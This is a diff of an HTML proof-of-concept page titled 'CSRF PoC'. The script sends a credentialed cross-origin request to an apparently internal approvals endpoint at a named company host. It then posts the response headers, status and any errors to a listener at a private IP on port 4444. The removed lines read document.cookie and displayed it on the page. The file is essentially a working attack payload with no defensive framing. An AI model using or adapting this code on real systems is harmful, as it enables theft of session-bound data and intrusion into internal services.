@@ -1,40 +1,41 @@
-<!DOCTYPE html>
 <html>
 <body>
-<h2></h2>
-<div id="cookieData"></div>
-<pre id="responseData"></pre>
-
+<h1>CSRF PoC</h1>
 <script>
-function captureCookies() {
-    let cookieStr = document.cookie;
-    document.getElementById('cookieData').innerHTML = '<strong>Captured Cookies:</strong><br>' + cookieStr;
-    
-    document.cookie.split(';').forEach(cookie => console.log(cookie.trim()));
-}
-
 fetch('https://internal.horizonnut.com/RTT/RttApprovals', {
     method: 'GET',
     mode: 'cors',
     credentials: 'include'
 })
 .then(response => {
-    console.log('Response status:', response.status);
-    console.log('Response headers:', response.headers);
+    // Capture response details
+    let responseData = {
+        status: response.status,
+        headers: {}
+    };
     for (let [key, value] of response.headers) {
-        console.log(`${key}: ${value}`);
+        responseData.headers[key] = value;
     }
+    
+    fetch('http://192.168.109.255:4444', {
+        method: 'POST',
+        body: JSON.stringify(responseData),
+        mode: 'no-cors' 
+    });
+    
     return response.text();
 })
 .then(data => {
-    console.log('Response body:', data);
-    document.body.innerHTML += '<pre>' + data + '</pre>';
+    console.log('Response received');
 })
 .catch(error => {
     console.error('Error:', error);
-    document.body.innerHTML += '<p>Error: ' + error.message + '</p>';
+    fetch('http://192.168.109.255:4444', {
+        method: 'POST',
+        body: JSON.stringify({error: error.toString()}),
+        mode: 'no-cors'
+    });
 });
-window.onload = captureCookies;
 </script>
 </body>
 </html>
